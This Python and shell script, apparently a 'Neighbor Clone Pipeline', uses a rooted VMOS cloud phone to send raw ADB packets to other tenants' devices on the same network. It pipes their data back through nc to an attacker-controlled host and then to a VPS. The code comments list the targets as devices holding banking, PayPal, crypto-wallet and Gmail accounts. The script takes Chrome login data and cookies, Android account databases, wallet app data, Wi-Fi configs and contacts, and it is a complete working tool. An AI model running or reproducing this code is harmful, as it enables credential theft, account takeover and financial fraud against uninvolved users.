#!/usr/bin/env python3
"""
Neighbor Clone Pipeline v1.0
============================
Extracts full /data from neighbor VMOS devices using:
1. Root ADB access to neighbors (confirmed: uid=0 on all targets)
2. nc reverse pipe: neighbor → APP6476
3. VPS ADB pull: APP6476 → VPS

Architecture:
  VPS --(VMOS API)--> APP6476 --(raw ADB:5555)--> Neighbor
  Neighbor --(nc/tar)--> APP6476 --(VPS adb pull)--> VPS
"""

import asyncio
import subprocess
import time
import sys
import os
import json

sys.stdout.reconfigure(line_buffering=True)

# ─── Config ───────────────────────────────────────────────────────────
PAD = "APP6476KYH9KMLU5"
OUR_IP = "10.12.11.186"
TARGETS = [
    "10.12.21.175",   # SM-S9110 (S25), niceproxy.io UK, 2 Gmail
    "10.12.27.39",    # Pixel 4, dataimpulse residential, wallet apps
    "10.12.36.76",    # SM-A225F, Trade Republic banking
    "10.12.31.245",   # SM-S9010, PayPal
]
BASE_PORT = 12345
REMOTE_DIR = "/data/local/tmp/clone/extracts"
LOCAL_DIR = "/root/CascadeProjects/vmos-titan-unified/neighbor_clones"

# Critical paths to extract from each neighbor
EXTRACT_PATHS = " ".join([
    "/data/data/com.google.android.gms/databases",
    "/data/data/com.google.android.gms/shared_prefs",
    "/data/data/com.android.chrome/app_chrome/Default",
    "/data/data/com.android.chrome/app_chrome/Default/Login\\ Data",
    "/data/data/com.android.chrome/app_chrome/Default/Cookies",
    "/data/data/com.android.chrome/app_chrome/Default/Web\\ Data",
    "/data/data/com.android.vending/databases",
    "/data/data/com.google.android.gms/app_chimera",
    "/data/system/users",
    "/data/system_ce/0/accounts_ce.db",
    "/data/system_de/0/accounts_de.db",
    "/data/misc_ce/0",
    "/data/misc/adb",
    "/data/misc/wifi",
    "/data/data/com.google.android.apps.walletnfcrel",
    "/data/data/com.android.providers.contacts/databases",
    "/data/data/com.android.providers.telephony/databases",
])

# ─── On-device extraction script ─────────────────────────────────────
# This runs entirely on APP6476 (our rooted device)
CLONE_SCRIPT = r'''#!/system/bin/sh
# Neighbor Clone Extraction Script
# Runs on APP6476, extracts from neighbors via raw ADB + nc reverse pipe

OUR_IP="__OUR_IP__"
OUTDIR="__REMOTE_DIR__"
LOGFILE="$OUTDIR/clone.log"
mkdir -p $OUTDIR

log() { echo "[$(date +%H:%M:%S)] $1" >> $LOGFILE; echo "[$(date +%H:%M:%S)] $1"; }
status() { echo "$1" >> $OUTDIR/status.txt; }

# Build ADB CNXN packet (binary)
build_cnxn() {
    local f="$OUTDIR/pkt_cnxn.bin"
    printf '\x43\x4e\x58\x4e' > $f    # CNXN
    printf '\x01\x00\x00\x01' >> $f    # version 0x01000001
    printf '\x00\x00\x10\x00' >> $f    # maxdata 4096
    printf '\x17\x00\x00\x00' >> $f    # payload len 23
    printf '\x00\x00\x00\x00' >> $f    # checksum 0
    printf '\xbc\xb1\xa7\xb1' >> $f    # magic ~CNXN
    printf 'host::features=shell_v2,cmd\x00' >> $f
}

# Build ADB OPEN packet for shell command
build_open() {
    local cmd="shell:$1"
    local f="$OUTDIR/pkt_open.bin"
    local full="${cmd}"
    local len=$((${#full} + 1))  # +1 for null terminator
    
    # Length bytes (little-endian uint32)
    local b0=$((len & 255))
    local b1=$(((len >> 8) & 255))
    local b2=$(((len >> 16) & 255))
    local b3=$(((len >> 24) & 255))
    
    printf '\x4f\x50\x45\x4e' > $f     # OPEN
    printf '\x01\x00\x00\x00' >> $f     # local-id = 1
    printf '\x00\x00\x00\x00' >> $f     # remote-id = 0
    printf "\\x$(printf '%02x' $b0)\\x$(printf '%02x' $b1)\\x$(printf '%02x' $b2)\\x$(printf '%02x' $b3)" >> $f
    printf '\x00\x00\x00\x00' >> $f     # checksum 0
    printf '\xb0\xaf\xba\xb1' >> $f     # magic ~OPEN
    printf '%s\x00' "$cmd" >> $f
}

# Extract from one target
extract_target() {
    local TARGET=$1
    local PORT=$2
    local SAFE=$(echo $TARGET | tr '.' '_')
    local TARBALL="$OUTDIR/${SAFE}.tar.gz"
    
    log "=========================================="
    log "EXTRACTING: $TARGET → port $PORT"
    status "EXTRACT_START $TARGET"
    
    # Step 1: Start nc listener in background
    rm -f "$TARBALL"
    nc -l -p $PORT > "$TARBALL" 2>/dev/null &
    local NC_PID=$!
    log "  NC listener PID=$NC_PID on port $PORT"
    sleep 1
    
    # Step 2: Build ADB packets
    # The neighbor command: tar critical data + pipe back via nc
    local NEIGHBOR_CMD="tar czf - __EXTRACT_PATHS__ 2>/dev/null | nc $OUR_IP $PORT"
    
    build_cnxn
    build_open "$NEIGHBOR_CMD"
    
    log "  OPEN packet: $(wc -c < $OUTDIR/pkt_open.bin) bytes"
    log "  Command: $NEIGHBOR_CMD"
    
    # Step 3: Send ADB handshake + command
    {
        cat "$OUTDIR/pkt_cnxn.bin"
        sleep 1
        cat "$OUTDIR/pkt_open.bin"
        # Keep connection alive for transfer
        sleep 180
    } | nc -w 185 $TARGET 5555 > /dev/null 2>&1 &
    local ADB_PID=$!
    log "  ADB relay PID=$ADB_PID"
    
    # Step 4: Wait for transfer (poll every 10s, max 180s)
    local elapsed=0
    local last_size=0
    local stale_count=0
    while [ $elapsed -lt 180 ]; do
        sleep 10
        elapsed=$((elapsed + 10))
        
        # Check if nc listener finished
        if ! kill -0 $NC_PID 2>/dev/null; then
            log "  NC listener done at ${elapsed}s"
            break
        fi
        
        local SIZE=$(stat -c%s "$TARBALL" 2>/dev/null || echo 0)
        log "  [${elapsed}s] Received: ${SIZE} bytes"
        
        # Check for stale transfer (no growth for 30s)
        if [ "$SIZE" = "$last_size" ] && [ "$SIZE" -gt 0 ]; then
            stale_count=$((stale_count + 1))
            if [ $stale_count -ge 3 ]; then
                log "  Transfer stalled, stopping"
                break
            fi
        else
            stale_count=0
        fi
        last_size=$SIZE
    done
    
    # Cleanup
    kill $NC_PID $ADB_PID 2>/dev/null
    wait $NC_PID 2>/dev/null
    wait $ADB_PID 2>/dev/null
    
    local FINAL_SIZE=$(stat -c%s "$TARBALL" 2>/dev/null || echo 0)
    log "  RESULT: ${FINAL_SIZE} bytes"
    
    if [ "$FINAL_SIZE" -gt 100 ]; then
        if gzip -t "$TARBALL" 2>/dev/null; then
            log "  VALID gzip archive"
            status "EXTRACT_OK $TARGET ${FINAL_SIZE}"
        else
            log "  WARNING: not valid gzip, keeping anyway"
            status "EXTRACT_PARTIAL $TARGET ${FINAL_SIZE}"
        fi
    else
        log "  FAILED - too small or empty"
        status "EXTRACT_FAIL $TARGET ${FINAL_SIZE}"
        
        # Fallback: try extracting individual files via ADB shell + base64
        log "  FALLBACK: trying ADB base64 extraction..."
        fallback_extract "$TARGET" "$SAFE"
    fi
}

# Fallback: extract individual critical files via ADB shell output
fallback_extract() {
    local TARGET=$1
    local SAFE=$2
    local FBDIR="$OUTDIR/fallback_${SAFE}"
    mkdir -p "$FBDIR"
    
    # Critical small files to extract via base64
    local FILES="
/data/system_ce/0/accounts_ce.db
/data/system_de/0/accounts_de.db
/data/system/users/0/settings_ssaid.xml
/data/misc/wifi/WifiConfigStore.xml
/data/data/com.google.android.gms/shared_prefs/COIN.xml
/data/data/com.google.android.gms/databases/phenotype.db
"
    
    for FILE in $FILES; do
        local BASENAME=$(basename "$FILE")
        log "    Extracting: $FILE → $BASENAME"
        
        # Build OPEN packet for base64 extraction
        build_cnxn
        build_open "base64 $FILE 2>/dev/null; echo __B64_END__"
        
        # Send and capture output
        local RAW=$({
            cat "$OUTDIR/pkt_cnxn.bin"
            sleep 0.5
            cat "$OUTDIR/pkt_open.bin"
            sleep 5
        } | nc -w 8 $TARGET 5555 2>/dev/null)
        
        # Extract base64 data (strip ADB protocol headers)
        echo "$RAW" | strings | grep -v '^CNXN' | grep -v '^OKAY' | grep -v '^WRTE' | grep -v '__B64_END__' | tr -d '\n' > "$FBDIR/${BASENAME}.b64"
        
        local B64SIZE=$(stat -c%s "$FBDIR/${BASENAME}.b64" 2>/dev/null || echo 0)
        if [ "$B64SIZE" -gt 10 ]; then
            base64 -d "$FBDIR/${BASENAME}.b64" > "$FBDIR/${BASENAME}" 2>/dev/null
            rm -f "$FBDIR/${BASENAME}.b64"
            log "    OK: $(stat -c%s "$FBDIR/${BASENAME}" 2>/dev/null) bytes"
        else
            rm -f "$FBDIR/${BASENAME}.b64"
            log "    FAILED"
        fi
        
        sleep 2
    done
    
    status "FALLBACK_DONE $TARGET"
}

# ─── MAIN ───
log "=========================================="
log "NEIGHBOR CLONE PIPELINE v1.0"
log "Our IP: $OUR_IP"
log "Output: $OUTDIR"
log "Targets: __TARGET_LIST__"
log "=========================================="

echo "" > $OUTDIR/status.txt

# First: quick connectivity test
log "Testing nc reverse pipe..."
echo "NC_OK" | nc -l -p 19999 -w 5 > $OUTDIR/nc_selftest.txt 2>/dev/null &
sleep 1
echo "NC_OK" | nc -w 2 127.0.0.1 19999 2>/dev/null
sleep 2
if grep -q NC_OK $OUTDIR/nc_selftest.txt 2>/dev/null; then
    log "NC self-test: PASS"
else
    log "NC self-test: FAIL (might still work with neighbors)"
fi

# Extract from each target sequentially
__EXTRACT_CALLS__

log "=========================================="
log "ALL EXTRACTIONS COMPLETE"
ls -lh $OUTDIR/*.tar.gz $OUTDIR/fallback_* 2>/dev/null
log "=========================================="
status "ALL_DONE $(date +%s)"
'''.replace("__OUR_IP__", OUR_IP).replace("__REMOTE_DIR__", REMOTE_DIR).replace(
    "__EXTRACT_PATHS__", EXTRACT_PATHS
).replace(
    "__TARGET_LIST__", " ".join(TARGETS)
).replace(
    "__EXTRACT_CALLS__", "\n".join(
        f'extract_target "{t}" {BASE_PORT + i}' for i, t in enumerate(TARGETS)
    )
)


async def main():
    from vmos_titan.core.vmos_cloud_api import VMOSCloudClient
    c = VMOSCloudClient(
        ak='YOUR_VMOS_AK_HERE',
        sk='YOUR_VMOS_SK_HERE',
        base_url='https://api.vmoscloud.com'
    )

    async def cmd(command, timeout=30):
        r = await c.sync_cmd(PAD, command, timeout_sec=timeout)
        return r.get('data', [{}])[0].get('errorMsg', '')

    async def fire(command):
        await c.async_adb_cmd([PAD], command)

    print("╔════════════════════════════════════════════════════════════════════╗")
    print("║  NEIGHBOR CLONE PIPELINE v1.0                                    ║")
    print("║  VPS → APP6476 → Neighbors → nc pipe → APP6476 → adb pull → VPS ║")
    print("╚════════════════════════════════════════════════════════════════════╝")

    # ── Phase 1: Enable ADB on APP6476 from VPS ──────────────────────
    print("\n[Phase 1] Enabling ADB on APP6476...")
    adb_info = await c.get_adb_info(PAD, enable=True)
    print(f"  ADB info: {json.dumps(adb_info, indent=2)[:500]}")

    # Try to extract ADB connection details
    adb_data = adb_info.get('data', {})
    adb_host = adb_data.get('adbIp') or adb_data.get('ip') or adb_data.get('host', '')
    adb_port = adb_data.get('adbPort') or adb_data.get('port', '')
    print(f"  ADB endpoint: {adb_host}:{adb_port}")
    time.sleep(3)

    # Also enable via the enable_adb method
    r = await c.enable_adb([PAD], enable=True)
    print(f"  enable_adb: {r.get('msg', '?')}")
    time.sleep(3)

    # Connect from VPS via adb
    if adb_host and adb_port:
        adb_target = f"{adb_host}:{adb_port}"
        print(f"\n[Phase 1b] Connecting VPS adb to {adb_target}...")
        result = subprocess.run(
            ["adb", "connect", adb_target],
            capture_output=True, text=True, timeout=15
        )
        print(f"  adb connect: {result.stdout.strip()} {result.stderr.strip()}")

        time.sleep(2)
        result = subprocess.run(
            ["adb", "-s", adb_target, "shell", "id"],
            capture_output=True, text=True, timeout=10
        )
        print(f"  adb shell id: {result.stdout.strip()}")

    # ── Phase 2: Push extraction script to APP6476 ───────────────────
    print("\n[Phase 2] Pushing clone script to APP6476...")
    
    # Clean up old results
    await cmd(f'rm -rf {REMOTE_DIR}; mkdir -p {REMOTE_DIR}')
    time.sleep(3)

    # Push script via base64 chunks
    import base64
    script_bytes = CLONE_SCRIPT.encode()
    b64 = base64.b64encode(script_bytes).decode()
    chunk_size = 3000
    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
    
    script_path = f"{REMOTE_DIR}/clone.sh"
    
    for i, chunk in enumerate(chunks):
        op = ">" if i == 0 else ">>"
        await cmd(f"echo '{chunk}' {op} {REMOTE_DIR}/clone_b64.txt")
        time.sleep(3)
        print(f"  Chunk {i+1}/{len(chunks)} pushed")

    # Decode and verify
    await cmd(f"base64 -d {REMOTE_DIR}/clone_b64.txt > {script_path}; chmod 755 {script_path}")
    time.sleep(3)
    
    verify = await cmd(f"wc -c {script_path}; head -3 {script_path}")
    print(f"  Verify: {verify}")
    time.sleep(3)

    # ── Phase 3: Fire extraction script ──────────────────────────────
    print("\n[Phase 3] Firing clone script on APP6476 (background)...")
    await fire(f"nohup sh {script_path} > {REMOTE_DIR}/stdout.txt 2>&1 &")
    time.sleep(5)

    # Verify it's running
    running = await cmd(f'ps -ef | grep clone.sh | grep -v grep | head -3')
    print(f"  Running: {running}")

    # ── Phase 4: Poll for completion ─────────────────────────────────
    print("\n[Phase 4] Polling for completion...")
    start = time.time()
    max_wait = 900  # 15 minutes max (4 targets × ~180s each)
    
    while time.time() - start < max_wait:
        time.sleep(15)
        elapsed = int(time.time() - start)
        
        status = await cmd(f'tail -3 {REMOTE_DIR}/status.txt 2>/dev/null')
        log_tail = await cmd(f'tail -5 {REMOTE_DIR}/clone.log 2>/dev/null')
        time.sleep(3)
        
        print(f"  [{elapsed}s] Status: {status.strip()}")
        if log_tail.strip():
            print(f"         Log: {log_tail.strip()[:200]}")
        
        if "ALL_DONE" in status:
            print("  ✅ ALL EXTRACTIONS COMPLETE!")
            break
    else:
        print("  ⚠ Timeout reached, checking partial results...")

    # ── Phase 5: Check results ───────────────────────────────────────
    print("\n[Phase 5] Checking extracted files...")
    time.sleep(3)
    listing = await cmd(f'ls -lh {REMOTE_DIR}/ 2>/dev/null')
    print(listing)
    time.sleep(3)
    
    full_status = await cmd(f'cat {REMOTE_DIR}/status.txt 2>/dev/null')
    print(f"\nFull status:\n{full_status}")
    time.sleep(3)
    
    full_log = await cmd(f'cat {REMOTE_DIR}/clone.log 2>/dev/null')
    print(f"\nFull log:\n{full_log}")

    # ── Phase 6: Pull files to VPS ───────────────────────────────────
    print("\n[Phase 6] Pulling extracted files to VPS...")
    os.makedirs(LOCAL_DIR, exist_ok=True)
    
    if adb_host and adb_port:
        adb_target = f"{adb_host}:{adb_port}"
        # Pull everything
        result = subprocess.run(
            ["adb", "-s", adb_target, "pull", REMOTE_DIR, LOCAL_DIR],
            capture_output=True, text=True, timeout=300
        )
        print(f"  adb pull: {result.stdout.strip()}")
        if result.stderr.strip():
            print(f"  stderr: {result.stderr.strip()}")
        
        # List local files
        for f in os.listdir(LOCAL_DIR):
            fpath = os.path.join(LOCAL_DIR, f)
            size = os.path.getsize(fpath) if os.path.isfile(fpath) else 0
            print(f"  {f}: {size:,} bytes")
    else:
        # Fallback: download via base64 chunks through sync_cmd
        print("  No ADB connection. Falling back to base64 chunk download...")
        tarballs = await cmd(f'ls {REMOTE_DIR}/*.tar.gz 2>/dev/null')
        for tarball in tarballs.strip().split('\n'):
            if not tarball.strip():
                continue
            basename = os.path.basename(tarball.strip())
            local_path = os.path.join(LOCAL_DIR, basename)
            print(f"  Downloading {basename}...")
            
            # Get size first
            size_str = await cmd(f'stat -c%s {tarball.strip()} 2>/dev/null')
            time.sleep(3)
            size = int(size_str.strip()) if size_str.strip().isdigit() else 0
            
            if size < 100:
                print(f"    Skipping (too small: {size})")
                continue

            # Download via base64 chunks (4KB per chunk ≈ 3KB binary)
            offset = 0
            b64_chunk = 3072  # base64 of ~2KB binary chunks
            with open(local_path, 'wb') as f:
                while offset < size:
                    chunk = await cmd(
                        f'dd if={tarball.strip()} bs=2048 skip={offset//2048} count=1 2>/dev/null | base64'
                    )
                    time.sleep(3)
                    if not chunk.strip():
                        break
                    f.write(base64.b64decode(chunk.strip()))
                    offset += 2048
                    if offset % 20480 == 0:
                        print(f"    {offset}/{size} bytes...")
            
            print(f"    Saved: {os.path.getsize(local_path):,} bytes")

    print("\n╔════════════════════════════════════════════════════════════════════╗")
    print("║  CLONE PIPELINE COMPLETE                                         ║")
    print("╚════════════════════════════════════════════════════════════════════╝")


if __name__ == "__main__":
    asyncio.run(main())
